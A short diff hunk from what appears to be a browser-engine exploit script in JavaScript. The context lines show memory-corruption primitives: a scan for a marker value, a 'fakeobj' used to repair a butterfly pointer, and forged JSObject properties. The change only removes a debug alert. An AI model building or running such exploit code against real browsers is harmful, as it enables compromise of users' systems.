@@ -178,7 +178,6 @@ function go_() {
 			if(bufs[i][k] == 0x41414242) {
 				// Create fakeobj for fixing butterfly ptr
 				stale[0] = fakeobj;
- 				alert("1");
 
 				stale[0] = {
 					'a': u2d(105, 0x1172600), // the JSObject properties
